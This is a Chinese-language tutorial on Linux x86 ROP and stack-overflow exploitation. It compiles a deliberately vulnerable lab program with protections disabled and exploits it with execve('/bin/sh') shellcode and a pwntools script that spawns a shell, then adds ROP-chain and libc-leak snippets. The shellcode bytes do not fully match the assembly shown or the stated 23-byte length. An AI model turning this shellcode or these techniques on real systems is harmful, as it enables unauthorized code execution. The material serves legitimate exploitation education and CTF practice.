---
title: Linux x86 ROP 攻击入门教程：从栈溢出原理到实战复现
description: 系统梳理 Linux x86 环境下 ROP 攻击入门核心知识：栈溢出原理、x86/x64 参数传递差异、保护机制（ASLR/NX/PIE/Canary）、偏移定位、Shellcode
  构造与实战利用流程，配合 GEF/Pwntools 完整复现演示。
category: program-analysis
tags:
- ROP
- Binary Exploitation
- Stack Overflow
- Linux x86
- Shellcode
- GEF
- Pwntools
- ASLR
- NX
- PIE
- Canary
- CTF
- 入门教程
date: '2020-03-15'
updated: '2026-11-13'
---
## 概述

**Return Oriented Programming (ROP，返回导向编程)** 是一种利用程序中已有代码片段（Gadget）通过控制栈实现任意代码执行的技术。核心思想：利用 `ret` 指令的 `pop IP` 行为，在可控栈上构造返回地址链，串联目标指令序列。

> 本页面基于 0w1Club 微信归档文章《ROP从入门到放弃》整理，结合《一步一步学ROP》系列补充系统化。适合具备基础 x86 汇编知识的初学者。原文链接：[ya0guang.github.io/hack/ROP101/](https://ya0guang.github.io/hack/ROP101/)

## 核心背景知识

### 栈内存布局与增长方向

- 栈从**高地址向低地址增长**
- `push` 操作使栈指针（ESP/RSP）减小，`pop` 操作使其增大
- 函数调用时：`call` 指令隐式 `push` 返回地址（下一条指令地址），随后跳转
- 函数返回时：`ret` 指令隐式 `pop` 栈顶值到 EIP/RIP，实现控制流转移
- **栈溢出本质**：向缓冲区写入超出其容量的数据，覆盖栈上保存的返回地址、帧指针（EBP/RBP）等关键控制数据

### x86 与 x86-64 参数传递差异（调用约定）

| 架构 | 前 N 个参数传递方式 | 剩余参数 | 返回值 |
|------|---------------------|----------|--------|
| **x86 (32-bit)** | 全部压栈（从右向左） | — | EAX |
| **x86-64 (64-bit, System V AMD64 ABI)** | 寄存器依次：`RDI, RSI, RDX, RCX, R8, R9` | 压栈（从右向左） | RAX |

> **实战意义**：构造 ROP 链调用 `system("/bin/sh")` 等函数时，必须按目标架构约定准备参数。x86 只需在栈上布置参数；x64 需寻找 `pop rdi; ret` 等 Gadget 将参数加载到寄存器。

**验证示例**（编译查看汇编）：
```bash
# x86
gcc -S -m32 printf8.c
# x86-64
gcc -S printf8.c
```
x86 版本可见 `pushl $1` … `pushl $8` 全部入栈；x64 版本前六个参数分别 `mov` 至 `RDI/RSI/RDX/RCX/R8/R9`，第 7、8 个参数再 `pushq` 入栈。

### 常见保护机制与查看工具

| 机制 | 作用 | 绕过思路 |
|------|------|----------|
| **ASLR (Address Space Layout Randomization)** | 随机化栈、堆、库、可执行文件基址 | 信息泄露、暴力破解（32 位熵低）、部分覆盖 |
| **NX / DEP (No-eXecute / Data Execution Prevention)** | 栈/堆不可执行，禁止直接运行 Shellcode | ROP、ret2libc、SROP、mprotect/mmap 修改内存权限 |
| **Stack Canary (栈保护)** | 函数序言在栈上放置随机 Cookie，返回前校验 | 格式化字符串泄露 Canary、栈读取漏洞、绕过校验逻辑 |
| **PIE (Position Independent Executable)** | 可执行文件基址随机化 | 信息泄露程序基址、利用非 PIE 模块（如 libc）Gadget |
| **RELRO (Relocation Read-Only)** | Partial/Full：GOT 表只读化，防止劫持 GOT 条目 | Full RELRO 下无法修改 GOT，需转向 ROP/ret2libc |

**查看命令**（需安装 `pwntools`）：
```bash
checksec ./binary
```
输出示例：
```
[*] '/path/binary'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

**临时关闭 ASLR（需 root）**：
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space  # 关闭
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space  # 开启（默认）
```
> 详细机制原理见 [[linux-kernel-hardening-mechanisms]]。

## 实战演练：x86 栈溢出 → Shellcode 执行

### 实验环境准备

- 系统：Ubuntu 18.04+ / 任意 x86_64 Linux（需安装 32 位库：`sudo apt install libc6-dev-i386`）
- 工具：`gdb` + **GEF** (GDB Enhanced Features)、`pwntools` (Python)
- 编译目标程序（关闭主流防护）：
```c
// level1.c
#undef _FORTIFY_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 256);  // 读入 256 字节，buf 仅 128 字节 → 栈溢出
}

int main(int argc, char **argv) {
    vulnerable_function();
    write(STDOUT_FILENO, "Hello, World\n", 13);
    return 0;
}
```
```bash
gcc -fno-stack-protector -z execstack -no-pie -m32 -o level1 level1.c
```
- `-fno-stack-protector`：禁用 Canary
- `-z execstack`：栈可执行（允许直接跑 Shellcode）
- `-no-pie`：禁用 PIE，固定代码段基址
- `-m32`：生成 32 位程序

### 步骤 1：确定溢出偏移

```bash
gdb ./level1
```
GEF 交互：
```text
gef➤ pattern create 150
[+] Generated pattern of length 150: 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
gef➤ r
Starting program: /path/level1
[...]
Program received signal SIGSEGV, Segmentation fault.
[...]
eip: 0x6261616b ('k' 'a' 'a' 'b')
gef➤ pattern search 0x6261616b
[+] Found at offset 140 (little-endian)
```
**结论**：第 140 字节覆盖返回地址。Payload 结构：`[140 字节填充] + [4 字节目标地址]`。

### 步骤 2：准备 Shellcode（32 位 Linux `/bin/sh`）

经典 23 字节 Shellcode（`execve("/bin/sh", 0, 0)`）：
```nasm
xor eax, eax        ; 清零 EAX
push eax            ; 压入字符串终止符
push 0x68732f2f     ; "//sh" (小端序)
push 0x6e69622f     ; "/bin"
mov ebx, esp        ; EBX 指向 "/bin//sh"
push eax            ; 参数 argv = NULL
push ebx            ; 参数 filename = "/bin//sh"
mov ecx, esp        ; ECX 指向 argv 数组
mov al, 0xb         ; syscall 号 __NR_execve = 11
int 0x80            ; 触发系统调用
```
对应机器码：
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```
> 也可用 `pwntools` 生成：`shellcraft.sh()` / `asm(shellcraft.sh())`。

### 步骤 3：确定 Shellcode 在栈上的地址

方法 A：Core Dump 法（推荐，配合 Pwntools 自动化）
```python
# pwn1.py
from pwn import *

context.arch = 'i386'
context.os = 'linux'
binary = './level1'

# 1. 先用假地址跑一次，生成 core dump
payload = b'A' * 140 + p32(0xdeadbeef)  # 假返回地址
io = process(binary)
io.sendline(payload)
io.wait()
core = io.corefile
stack_addr = core.esp - 0x90  # 经验偏移，指向我们输入缓冲区起始附近
log.info(f"Estimated shellcode addr: {hex(stack_addr)}")

# 2. 构造最终 payload
shellcode = asm(shellcraft.sh())
payload = shellcode + b'A' * (140 - len(shellcode)) + p32(stack_addr)
io = process(binary)
io.sendline(payload)
io.interactive()
```
```bash
ulimit -c unlimited  # 允许生成 core 文件
python pwn1.py
```
方法 B：GDB 直接观察 `$esp` / `$ebp` 相对偏移。

### 步骤 4：获取 Shell

成功执行后交互：
```text
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
```
> 完整复现脚本见文章配套 GitHub：`zhengmin1989/ROP_STEP_BY_STEP/linux_x86`。

## 进阶扩展方向

| 场景 | 关键技术点 | 参考实战 |
|------|------------|----------|
| **开启 NX，栈不可执行** | ret2libc、ROP 链构造、`system("/bin/sh")`、泄露 libc 基址 | [[mtctf-2021-pwn-writeup]] (setcontext + mprotect) |
| **开启 ASLR + PIE** | 信息泄露（GOT/栈/堆地址）、部分覆盖、相对偏移计算 | [[xihulunjian-2020-iot-pwn3-ezarmpwn-writeup]] (ARM 栈上 libc 泄露) |
| **x64 环境** | 寄存器传参、寻找 `pop rdi; ret` 等 Gadget、栈对齐（16 字节） | [[d3ctf-2021-d3dev-qemu-escape-writeup]] (QEMU 虚拟机逃逸含 x64 ROP) |
| **存在 Canary** | 格式化字符串泄露、栈读取、绕过检查逻辑 | — |
| **SROP (Sigreturn Oriented Programming)** | 伪造 `sigcontext` 结构，控制全寄存器组 | 高级利用技巧 |

## 工具链速查

| 工具 | 用途 | 常用命令/片段 |
|------|------|---------------|
| **GEF** | GDB 增强：内存可视化、pattern、ROP gadget 搜索 | `pattern create`, `pattern search`, `ropper`, `searchmem` |
| **Pwntools** | Exploit 开发框架：打包、ELF 解析、ROP 链自动生成 | `ELF()`, `ROP()`, `shellcraft()`, `process()`, `remote()` |
| **ROPgadget / ropper** | 静态二进制 Gadget 搜索 | `ROPgadget --binary ./level1 --only "pop|ret"` |
| **checksec.sh** | 快速查看二进制保护 | `checksec --file=./binary` |
| **pwninit / patchelf** | 修补二进制指定 libc/ld，便于本地调试 | `pwninit --bin ./binary --libc ./libc.so.6` |

## 学习路线建议

1. **夯实基础**：x86/x64 汇编、栈帧结构、调用约定、ELF 格式、链接加载过程 → 参考 [[reverse-engineering-beginner-learning-path]]
2. **掌握工具**：熟练使用 GEF、Pwntools、ROPgadget
3. **循序渐进**：
   - 无保护栈溢出 → Shellcode 执行（本页）
   - ret2libc / ROP 绕过 NX
   - 信息泄露绕过 ASLR/PIE
   - Canary 绕过
   - 堆利用、SROP、Vtable 劫持等高级技巧
4. **实战靶场**：
   - **ROP Emporium** (入门 ROP 练习)
   - **pwnable.kr / pwnable.tw** (经典题目)
   - **BUUCTF / XCTF** 存量题库
   - **CTFtime** 近期比赛 Writeup 复现

## 交叉引用

- [[linux-kernel-hardening-mechanisms]] — 系统级缓解措施深度解析（ASLR/NX/PIE/Canary/CFI 等）
- [[reverse-engineering-beginner-learning-path]] — 逆向工程/二进制分析入门学习路线
- [[mtctf-2021-pwn-writeup]] — 堆利用 + setcontext/mprotect 执行 Shellcode 实战
- [[xihulunjian-2020-iot-pwn3-ezarmpwn-writeup]] — ARM 32 位环境下栈溢出 ROP 与堆利用对比
- [[d3ctf-2021-d3dev-qemu-escape-writeup]] — QEMU 虚拟机逃逸中的 x64 ROP 链构造
- [[0w1club-wechat-archive-201908-202207]] — 文章来源归档索引（含本教程原文）

## 附录：常用 GEF/Pwntools 片段

```python
# Pwntools: 自动生成 ROP 链调用 system("/bin/sh")
from pwn import *
elf = ELF('./binary')
rop = ROP(elf)
rop.system(next(elf.search(b'/bin/sh')))
payload = flat({offset: rop.chain()})
```

```text
# GEF: 搜索可用 gadget
gef➤ ropper --search "pop rdi"
gef➤ ropper --search "mov.*rdi.*rsi"
gef➤ search-pattern "/bin/sh"
```

```python
# Pwntools: 泄露 libc 基址（puts GOT）
rop.puts(elf.got['puts'])
rop.main()
# 发送 payload 接收泄露地址 → 计算 libc.base → 二次利用
```

---
*页面维护：数字知识库策展人 | 来源：0w1Club 微信归档（ya0guang 原文） | 更新：2025-01-14*

## 来源

- [0w1Club-201908-202207_15](../sources/0w1Club-201908-202207_15.md)
